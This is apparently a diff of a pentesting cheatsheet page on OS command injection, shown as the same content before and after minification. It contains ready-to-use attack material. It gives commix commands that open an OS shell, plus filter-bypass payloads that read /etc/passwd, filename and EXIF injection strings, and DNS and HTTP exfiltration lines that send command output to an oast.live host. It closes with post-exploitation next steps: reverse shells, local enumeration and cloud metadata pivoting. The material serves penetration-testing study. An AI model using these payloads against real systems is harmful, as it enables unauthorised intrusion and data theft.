-</span></span></code></pre></div><h2 id="vi-bypass-tricks-when-input-is-filtered" data-heading-permalink="true"><span class="heading-content">vi. Bypass tricks when input is filtered</span>
-    <a class="heading-permalink" href="#vi-bypass-tricks-when-input-is-filtered" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When obvious chars (<code>;</code>, <code>|</code>, <code>&amp;</code>) are stripped or quoted:</p>
-<h3 id="no-spaces" data-heading-permalink="true"><span class="heading-content">No spaces</span>
-    <a class="heading-permalink" href="#no-spaces" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>${IFS}            ## bash internal field separator = space-equivalent
+</code></pre><h2 id=iii-interactsh--burp-collaborator data-heading-permalink=true><span class=heading-content>iii. interactsh + Burp Collaborator</span>
+<a class=heading-permalink href=#iii-interactsh--burp-collaborator aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>OAST is the default for blind detection. Spin up a listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>interactsh-client
+</span></span><span class=line><span class=cl><span class=c1>## Or use the public service:</span>
+</span></span><span class=line><span class=cl>interactsh-client -s https://oast.live
+</span></span><span class=line><span class=cl><span class=c1>## Or Burp Collaborator from inside Burp</span>
+</span></span></code></pre></div><p>Every payload includes the OAST hostname. When the target shells out, you see the inbound DNS / HTTP in your interactsh terminal.</p><h2 id=iv-commix data-heading-permalink=true><span class=heading-content>iv. commix</span>
+<a class=heading-permalink href=#iv-commix aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The sqlmap of command injection. Automates detection, exploitation, shell upgrade.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## URL parameter:</span>
+</span></span><span class=line><span class=cl>commix -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/ping?ip=127.0.0.1&#34;</span> --batch
+</span></span><span class=line><span class=cl><span class=c1>## POST body:</span>
+</span></span><span class=line><span class=cl>commix -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/ping&#34;</span> --data <span class=s1>&#39;ip=127.0.0.1&#39;</span> --batch
+</span></span><span class=line><span class=cl><span class=c1>## Header:</span>
+</span></span><span class=line><span class=cl>commix -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/&#34;</span> --headers<span class=o>=</span><span class=s1>&#39;User-Agent: test*&#39;</span> --batch
+</span></span><span class=line><span class=cl><span class=c1>## Cookie:</span>
+</span></span><span class=line><span class=cl>commix -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/&#34;</span> --cookie <span class=s1>&#39;session=abc;ip=127.0.0.1*&#39;</span> --batch
+</span></span><span class=line><span class=cl><span class=c1>## From Burp request:</span>
+</span></span><span class=line><span class=cl>commix -r request.txt --batch
+</span></span></code></pre></div><p>Useful flags:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--os<span class=o>=</span>unix             <span class=c1>## skip OS detection</span>
+</span></span><span class=line><span class=cl>--technique<span class=o>=</span>tT        <span class=c1>## t=time-based, T=time-based file-based, c=classic, e=eval-based</span>
+</span></span><span class=line><span class=cl>--prefix<span class=o>=</span><span class=s1>&#39;;&#39;</span> --suffix<span class=o>=</span><span class=s1>&#39;#&#39;</span>
+</span></span><span class=line><span class=cl>--all                 <span class=c1>## try every technique</span>
+</span></span><span class=line><span class=cl>--os-cmd<span class=o>=</span>id           <span class=c1>## one-shot command</span>
+</span></span><span class=line><span class=cl>--shellshock          <span class=c1>## try Shellshock (legacy CVE-2014-6271)</span>
+</span></span><span class=line><span class=cl>--proxy<span class=o>=</span>http://127.0.0.1:8080
+</span></span><span class=line><span class=cl>--tor                 <span class=c1>## via tor proxy</span>
+</span></span></code></pre></div><p>Drop to a shell when commix confirms:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>commix -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/ping?ip=127.0.0.1&#34;</span> --batch --os-shell
+</span></span></code></pre></div><h2 id=v-fuzzing-many-params-at-once data-heading-permalink=true><span class=heading-content>v. Fuzzing many params at once</span>
+<a class=heading-permalink href=#v-fuzzing-many-params-at-once aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you have a list of endpoints and want quick scoping:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/FUZZ?val=%3Bcurl%20http%3A%2F%2Fabc.oast.live&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -w endpoints.txt -mc all
+</span></span><span class=line><span class=cl><span class=c1>## Then watch interactsh for hits</span>
+</span></span></code></pre></div><p>Nuclei has command-injection templates that test common patterns:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nuclei -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>&#34;</span> -tags rce,cmdi -t http/cves/ -t http/vulnerabilities/
+</span></span></code></pre></div><h2 id=vi-bypass-tricks-when-input-is-filtered data-heading-permalink=true><span class=heading-content>vi. Bypass tricks when input is filtered</span>
+<a class=heading-permalink href=#vi-bypass-tricks-when-input-is-filtered aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When obvious chars (<code>;</code>, <code>|</code>, <code>&</code>) are stripped or quoted:</p><h3 id=no-spaces data-heading-permalink=true><span class=heading-content>No spaces</span>
+<a class=heading-permalink href=#no-spaces aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>${IFS}            ## bash internal field separator = space-equivalent
 $IFS$9            ## alternative form
 {cmd,arg1,arg2}   ## brace expansion separator
 &lt;                 ## redirect-style: cmd&lt;/etc/passwd
-</code></pre><h3 id="no-slash-when--filtered" data-heading-permalink="true"><span class="heading-content">No slash (when <code>/</code> filtered)</span>
-    <a class="heading-permalink" href="#no-slash-when--filtered" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>${PATH:0:1}                 ## first char of $PATH = /
+</code></pre><h3 id=no-slash-when--filtered data-heading-permalink=true><span class=heading-content>No slash (when <code>/</code> filtered)</span>
+<a class=heading-permalink href=#no-slash-when--filtered aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>${PATH:0:1}                 ## first char of $PATH = /
 $(echo${IFS}-e${IFS}&#39;\x2f&#39;) ## hex /
-</code></pre><h3 id="no-keywords-id-cat-ls-filtered" data-heading-permalink="true"><span class="heading-content">No keywords (id, cat, ls filtered)</span>
-    <a class="heading-permalink" href="#no-keywords-id-cat-ls-filtered" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>i\d         ## backslash inside double quotes is OK
+</code></pre><h3 id=no-keywords-id-cat-ls-filtered data-heading-permalink=true><span class=heading-content>No keywords (id, cat, ls filtered)</span>
+<a class=heading-permalink href=#no-keywords-id-cat-ls-filtered aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>i\d         ## backslash inside double quotes is OK
 &#39;i&#39;d        ## single quote breaks string but keeps content
 &#39;i&#39;&#39;d       ## concatenated literals
 &#34;$(echo aWQ=|base64 -d)&#34;   ## base64 decode
-</code></pre><h3 id="no-quotes" data-heading-permalink="true"><span class="heading-content">No quotes</span>
-    <a class="heading-permalink" href="#no-quotes" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>$(printf &#34;%s&#34; id)
+</code></pre><h3 id=no-quotes data-heading-permalink=true><span class=heading-content>No quotes</span>
+<a class=heading-permalink href=#no-quotes aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>$(printf &#34;%s&#34; id)
 $(echo aWQ= | base64 -d)
-</code></pre><h3 id="bashfuscator-for-heavy-obfuscation" data-heading-permalink="true"><span class="heading-content">Bashfuscator for heavy obfuscation</span>
-    <a class="heading-permalink" href="#bashfuscator-for-heavy-obfuscation" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bashfuscator -c <span class="s1">&#39;id&#39;</span> -s <span class="m">1</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## generates a heavily obfuscated equivalent</span>
-</span></span></code></pre></div><h3 id="globbing-for-path-bypass" data-heading-permalink="true"><span class="heading-content">Globbing for path bypass</span>
-    <a class="heading-permalink" href="#globbing-for-path-bypass" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>/???/??t /etc/passwd     ## /bin/cat /etc/passwd
+</code></pre><h3 id=bashfuscator-for-heavy-obfuscation data-heading-permalink=true><span class=heading-content>Bashfuscator for heavy obfuscation</span>
+<a class=heading-permalink href=#bashfuscator-for-heavy-obfuscation aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bashfuscator -c <span class=s1>&#39;id&#39;</span> -s <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=c1>## generates a heavily obfuscated equivalent</span>
+</span></span></code></pre></div><h3 id=globbing-for-path-bypass data-heading-permalink=true><span class=heading-content>Globbing for path bypass</span>
+<a class=heading-permalink href=#globbing-for-path-bypass aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>/???/??t /etc/passwd     ## /bin/cat /etc/passwd
 /usr/bin/c*t /etc/passwd
-</code></pre><h2 id="vii-language-specific-gotchas" data-heading-permalink="true"><span class="heading-content">vii. Language-specific gotchas</span>
-    <a class="heading-permalink" href="#vii-language-specific-gotchas" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Different runtimes have different injection sinks. Identification + sink table:</p>
-<p><strong>PHP</strong>:</p>
-<ul>
-<li><code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>popen()</code>, <code>proc_open()</code></li>
-<li>Backticks: <code>`cmd`</code></li>
-<li><code>assert()</code> with user input = code execution</li>
-<li><code>preg_replace('/foo/e', $userinput)</code> (e modifier, legacy, still found)</li>
-</ul>
-<p><strong>Node.js</strong>:</p>
-<ul>
-<li><code>child_process.exec(userinput)</code> → most dangerous (uses shell)</li>
-<li><code>child_process.execSync()</code>, <code>spawn()</code> with shell:true</li>
-<li><code>eval()</code>, <code>Function()</code>, <code>vm.runInNewContext()</code></li>
-<li>Template literal injection in shell helpers (e.g. <code>shelljs</code>)</li>
-</ul>
-<p><strong>Python</strong>:</p>
-<ul>
-<li><code>os.system()</code>, <code>os.popen()</code>, <code>subprocess.Popen(shell=True)</code></li>
-<li><code>eval()</code>, <code>exec()</code>, <code>compile()</code></li>
-<li><code>pickle.loads()</code> with user input → see [[WEB14 Deserialization]]</li>
-<li>f-string SQL/shell building</li>
-</ul>
-<p><strong>Ruby</strong>:</p>
-<ul>
-<li><code>system()</code>, <code>exec()</code>, <code>eval()</code></li>
-<li>Backticks: <code>`cmd`</code></li>
-<li><code>%x{cmd}</code></li>
-<li><code>IO.popen(userinput)</code></li>
-<li><code>Kernel.eval(YAML.load(input))</code></li>
-</ul>
-<p><strong>Java</strong>:</p>
-<ul>
-<li><code>Runtime.getRuntime().exec(userinput)</code> - note: NO shell by default, so chaining (<code>;</code>, <code>&amp;&amp;</code>) doesn&rsquo;t work unless input is passed to <code>bash -c</code></li>
-<li><code>ProcessBuilder(userinput).start()</code></li>
-<li><code>Runtime.exec(new String[]{&quot;sh&quot;,&quot;-c&quot;,userinput})</code> is the dangerous variant</li>
-</ul>
-<p><strong>Perl</strong>:</p>
-<ul>
-<li><code>system()</code>, <code>exec()</code>, backticks</li>
-<li><code>open(F, &quot;| $userinput&quot;)</code> pipe-to-command via open</li>
-<li><code>qx//</code></li>
-</ul>
-<h2 id="viii-imagemagick-cve-2016-3714-and-variants" data-heading-permalink="true"><span class="heading-content">viii. ImageMagick (CVE-2016-3714 and variants)</span>
-    <a class="heading-permalink" href="#viii-imagemagick-cve-2016-3714-and-variants" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>ImageTragick is old but still hits. Test by uploading a crafted file:</p>
-<pre tabindex="0"><code>## MSL/MVG polyglot, ImageMagick processes the file:
+</code></pre><h2 id=vii-language-specific-gotchas data-heading-permalink=true><span class=heading-content>vii. Language-specific gotchas</span>
+<a class=heading-permalink href=#vii-language-specific-gotchas aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Different runtimes have different injection sinks. Identification + sink table:</p><p><strong>PHP</strong>:</p><ul><li><code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>popen()</code>, <code>proc_open()</code></li><li>Backticks: <code>`cmd`</code></li><li><code>assert()</code> with user input = code execution</li><li><code>preg_replace('/foo/e', $userinput)</code> (e modifier, legacy, still found)</li></ul><p><strong>Node.js</strong>:</p><ul><li><code>child_process.exec(userinput)</code> → most dangerous (uses shell)</li><li><code>child_process.execSync()</code>, <code>spawn()</code> with shell:true</li><li><code>eval()</code>, <code>Function()</code>, <code>vm.runInNewContext()</code></li><li>Template literal injection in shell helpers (e.g. <code>shelljs</code>)</li></ul><p><strong>Python</strong>:</p><ul><li><code>os.system()</code>, <code>os.popen()</code>, <code>subprocess.Popen(shell=True)</code></li><li><code>eval()</code>, <code>exec()</code>, <code>compile()</code></li><li><code>pickle.loads()</code> with user input → see <a href=/cheatsheets/web/web14-deserialization/>WEB14 Deserialization</a></li><li>f-string SQL/shell building</li></ul><p><strong>Ruby</strong>:</p><ul><li><code>system()</code>, <code>exec()</code>, <code>eval()</code></li><li>Backticks: <code>`cmd`</code></li><li><code>%x{cmd}</code></li><li><code>IO.popen(userinput)</code></li><li><code>Kernel.eval(YAML.load(input))</code></li></ul><p><strong>Java</strong>:</p><ul><li><code>Runtime.getRuntime().exec(userinput)</code> - note: NO shell by default, so chaining (<code>;</code>, <code>&&</code>) doesn&rsquo;t work unless input is passed to <code>bash -c</code></li><li><code>ProcessBuilder(userinput).start()</code></li><li><code>Runtime.exec(new String[]{"sh","-c",userinput})</code> is the dangerous variant</li></ul><p><strong>Perl</strong>:</p><ul><li><code>system()</code>, <code>exec()</code>, backticks</li><li><code>open(F, "| $userinput")</code> pipe-to-command via open</li><li><code>qx//</code></li></ul><h2 id=viii-imagemagick-cve-2016-3714-and-variants data-heading-permalink=true><span class=heading-content>viii. ImageMagick (CVE-2016-3714 and variants)</span>
+<a class=heading-permalink href=#viii-imagemagick-cve-2016-3714-and-variants aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>ImageTragick is old but still hits. Test by uploading a crafted file:</p><pre tabindex=0><code>## MSL/MVG polyglot, ImageMagick processes the file:
 ## (see PayloadsAllTheThings/Insecure Magick)
-</code></pre><p>ImageMagick + Ghostscript chain is still active in 2025. Look for any image upload that&rsquo;s converted server-side (thumbnails, format conversion).</p>
-<h2 id="ix-exif--filename-tricks" data-heading-permalink="true"><span class="heading-content">ix. EXIF + filename tricks</span>
-    <a class="heading-permalink" href="#ix-exif--filename-tricks" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When the app processes uploaded files:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Filename-based:</span>
-</span></span><span class="line"><span class="cl">mv <span class="k">$(</span><span class="nb">printf</span> <span class="s1">&#39;a;id;.jpg&#39;</span><span class="k">)</span>   <span class="c1">## if app does `convert &#34;$filename&#34; out.png`</span>
-</span></span><span class="line"><span class="cl">exiftool -Comment<span class="o">=</span><span class="s1">&#39;$(id)&#39;</span> x.jpg     <span class="c1">## if EXIF is read into a shell command later</span>
-</span></span></code></pre></div><h2 id="x-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">x. Tricks worth knowing</span>
-    <a class="heading-permalink" href="#x-tricks-worth-knowing" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="output-redirection-when-theres-no-obvious-response" data-heading-permalink="true"><span class="heading-content">Output redirection when there&rsquo;s no obvious response</span>
-    <a class="heading-permalink" href="#output-redirection-when-theres-no-obvious-response" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>The command runs but you can&rsquo;t see output. Write output to a webroot-readable file:</p>
-<pre tabindex="0"><code>;id&gt;/var/www/html/r.txt
+</code></pre><p>ImageMagick + Ghostscript chain is still active in 2025. Look for any image upload that&rsquo;s converted server-side (thumbnails, format conversion).</p><h2 id=ix-exif--filename-tricks data-heading-permalink=true><span class=heading-content>ix. EXIF + filename tricks</span>
+<a class=heading-permalink href=#ix-exif--filename-tricks aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When the app processes uploaded files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Filename-based:</span>
+</span></span><span class=line><span class=cl>mv <span class=k>$(</span><span class=nb>printf</span> <span class=s1>&#39;a;id;.jpg&#39;</span><span class=k>)</span>   <span class=c1>## if app does `convert &#34;$filename&#34; out.png`</span>
+</span></span><span class=line><span class=cl>exiftool -Comment<span class=o>=</span><span class=s1>&#39;$(id)&#39;</span> x.jpg     <span class=c1>## if EXIF is read into a shell command later</span>
+</span></span></code></pre></div><h2 id=x-tricks-worth-knowing data-heading-permalink=true><span class=heading-content>x. Tricks worth knowing</span>
+<a class=heading-permalink href=#x-tricks-worth-knowing aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=output-redirection-when-theres-no-obvious-response data-heading-permalink=true><span class=heading-content>Output redirection when there&rsquo;s no obvious response</span>
+<a class=heading-permalink href=#output-redirection-when-theres-no-obvious-response aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>The command runs but you can&rsquo;t see output. Write output to a webroot-readable file:</p><pre tabindex=0><code>;id&gt;/var/www/html/r.txt
 ;id&gt;/tmp/r;cat /tmp/r
-</code></pre><h3 id="dns-exfil-for-tiny-outputs" data-heading-permalink="true"><span class="heading-content">DNS exfil for tiny outputs</span>
-    <a class="heading-permalink" href="#dns-exfil-for-tiny-outputs" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>When the output is small (1-2 lines) and HTTP egress is blocked:</p>
-<pre tabindex="0"><code>;nslookup `whoami`.oast.live
+</code></pre><h3 id=dns-exfil-for-tiny-outputs data-heading-permalink=true><span class=heading-content>DNS exfil for tiny outputs</span>
+<a class=heading-permalink href=#dns-exfil-for-tiny-outputs aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When the output is small (1-2 lines) and HTTP egress is blocked:</p><pre tabindex=0><code>;nslookup `whoami`.oast.live
 ;dig $(id|base64|head -1).oast.live
-</code></pre><h3 id="use-oast-for-confirmation-then-in-band-for-extraction" data-heading-permalink="true"><span class="heading-content">Use OAST for confirmation, then in-band for extraction</span>
-    <a class="heading-permalink" href="#use-oast-for-confirmation-then-in-band-for-extraction" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>First confirm injection via OAST DNS (works in nearly all environments). Then escalate to direct shell.</p>
-<h3 id="when-n-works-but--doesnt" data-heading-permalink="true"><span class="heading-content">When <code>\n</code> works but <code>;</code> doesn&rsquo;t</span>
-    <a class="heading-permalink" href="#when-n-works-but--doesnt" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>URL-encode newline: <code>%0a</code>. Lots of apps strip semicolons but pass newlines through:</p>
-<pre tabindex="0"><code>?host=127.0.0.1%0aid
+</code></pre><h3 id=use-oast-for-confirmation-then-in-band-for-extraction data-heading-permalink=true><span class=heading-content>Use OAST for confirmation, then in-band for extraction</span>
+<a class=heading-permalink href=#use-oast-for-confirmation-then-in-band-for-extraction aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>First confirm injection via OAST DNS (works in nearly all environments). Then escalate to direct shell.</p><h3 id=when-n-works-but--doesnt data-heading-permalink=true><span class=heading-content>When <code>\n</code> works but <code>;</code> doesn&rsquo;t</span>
+<a class=heading-permalink href=#when-n-works-but--doesnt aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>URL-encode newline: <code>%0a</code>. Lots of apps strip semicolons but pass newlines through:</p><pre tabindex=0><code>?host=127.0.0.1%0aid
 ?host=127.0.0.1%0acurl%20http://oast.live/
-</code></pre><h3 id="filename-with-backticks-via-multipart-upload" data-heading-permalink="true"><span class="heading-content">Filename with backticks via multipart upload</span>
-    <a class="heading-permalink" href="#filename-with-backticks-via-multipart-upload" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Some upload handlers shell out for thumbnailing without quoting:</p>
-<pre tabindex="0"><code>filename=&#34;x;id #.jpg&#34;
+</code></pre><h3 id=filename-with-backticks-via-multipart-upload data-heading-permalink=true><span class=heading-content>Filename with backticks via multipart upload</span>
+<a class=heading-permalink href=#filename-with-backticks-via-multipart-upload aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Some upload handlers shell out for thumbnailing without quoting:</p><pre tabindex=0><code>filename=&#34;x;id #.jpg&#34;
 filename=&#34;x`id`.jpg&#34;
 filename=&#34;$(id).jpg&#34;
-</code></pre><h2 id="xi-references" data-heading-permalink="true"><span class="heading-content">xi. References</span>
-    <a class="heading-permalink" href="#xi-references" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li><a href="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener noreferrer">PortSwigger - OS command injection</a>
-</li>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - Command Injection</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/command-injection" target="_blank" rel="noopener noreferrer">HackTricks - Command Injection</a>
-</li>
-<li><a href="https://github.com/Bashfuscator/Bashfuscator" target="_blank" rel="noopener noreferrer">Bashfuscator</a>
- - obfuscation generator</li>
-<li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a>
- - once you have shell, what to do with it</li>
-</ul>
-<h2 id="xii-where-it-leads" data-heading-permalink="true"><span class="heading-content">xii. Where it leads</span>
-    <a class="heading-permalink" href="#xii-where-it-leads" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Once <code>id</code> returns output (or sleeps confirm via OAST), it&rsquo;s full RCE in the web server&rsquo;s context. Standard next steps:</p>
-<ol>
-<li>Get a stable callback via [[Reverse Shells]]</li>
-<li>Land on the host → [[03 Shell &amp; Tooling]] → TTY upgrade</li>
-<li>Local enum → [[05 Local Enum]]</li>
-<li>Pivot deeper if on cloud → [[Cloud Recon]] for metadata endpoints</li>
-</ol>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web04-nosql-injection/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">NoSQL Injection</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web06-ssti/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">SSTI</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><h2 id=xi-references data-heading-permalink=true><span class=heading-content>xi. References</span>
+<a class=heading-permalink href=#xi-references aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li><a href=https://portswigger.net/web-security/os-command-injection target=_blank rel="noopener noreferrer">PortSwigger - OS command injection</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection target=_blank rel="noopener noreferrer">PayloadsAllTheThings - Command Injection</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/command-injection target=_blank rel="noopener noreferrer">HackTricks - Command Injection</a></li><li><a href=https://github.com/Bashfuscator/Bashfuscator target=_blank rel="noopener noreferrer">Bashfuscator</a>
+- obfuscation generator</li><li><a href=https://gtfobins.github.io/ target=_blank rel="noopener noreferrer">GTFOBins</a>
+- once you have shell, what to do with it</li></ul><h2 id=xii-where-it-leads data-heading-permalink=true><span class=heading-content>xii. Where it leads</span>
+<a class=heading-permalink href=#xii-where-it-leads aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Once <code>id</code> returns output (or sleeps confirm via OAST), it&rsquo;s full RCE in the web server&rsquo;s context. Standard next steps:</p><ol><li>Get a stable callback via <a href=/cheatsheets/misc/reverse-shells/>Reverse Shells</a></li><li>Land on the host → <a href=/cheatsheets/linux-pentesting/03-shell--tooling/>03 Shell & Tooling</a>
+→ TTY upgrade</li><li>Local enum → <a href=/cheatsheets/linux-pentesting/05-local-enum/>05 Local Enum</a></li><li>Pivot deeper if on cloud → <a href=/cheatsheets/cloud/cloud-recon/>Cloud Recon</a>
+for metadata endpoints</li></ol></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/web/web04-nosql-injection/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>NoSQL Injection</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/web/web06-ssti/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>SSTI</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
